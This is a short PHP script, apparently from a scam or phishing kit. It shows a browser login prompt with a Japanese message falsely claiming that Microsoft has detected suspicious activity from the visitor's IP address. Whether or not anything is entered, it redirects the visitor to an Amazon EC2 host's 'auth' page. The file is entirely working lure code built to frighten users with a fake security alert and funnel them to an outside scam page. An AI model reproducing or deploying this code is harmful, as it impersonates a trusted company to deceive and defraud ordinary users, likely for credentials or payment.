<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
	header('Content-Type: charset=utf-8');
	header('Content-Language: jp');
    header('WWW-Authenticate: Basic realm="MicrosoftがあなたのIPアドレスから疑わしい活動を検出しました。"');
    header('HTTP/1.0 401 Unauthorized');
	echo "<script>window.location.href='http://ec2-54-214-231-57.us-west-2.compute.amazonaws.com/auth/jp/auth.php'</script>";
    exit;
} 
elseif(isset($_SERVER['PHP_AUTH_USER'])) {
	header('Content-Type: charset=utf-8');
	header('Content-Language: jp');
    header('WWW-Authenticate: Basic realm="MicrosoftがあなたのIPアドレスから疑わしい活動を検出しました。"');
    header('HTTP/1.0 401 Unauthorized');
	echo "<script>window.location.href='http://ec2-54-214-231-57.us-west-2.compute.amazonaws.com/auth/jp/auth.php'</script>";
    exit;
} 
?>
